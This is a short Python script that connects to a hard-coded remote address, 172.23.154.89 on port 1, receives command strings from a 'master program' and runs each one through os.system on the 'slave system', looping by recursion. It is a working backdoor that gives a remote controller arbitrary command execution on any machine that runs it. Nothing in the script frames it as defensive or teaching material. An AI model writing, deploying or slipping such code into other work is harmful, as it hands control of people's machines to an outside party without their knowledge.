import time
import socket
import sys
import os
#ConnectionRefusedError
#Timmeouterror
def tryer():
# Initialize s to socket
	s = socket.socket()

# Initialize the host
	host = "172.23.154.89"

# Initialize the port
	port = 1

# bind the socket with port and host
	try:
		s.connect((host, port))

		print("Connected to Server.")

		# receive the command from master program
		command = s.recv(1024)
		command = command.decode()

		# match the command and execute it on slave system
		os.system(command)
		tryer()
	except:
		print("something wrong")

tryer()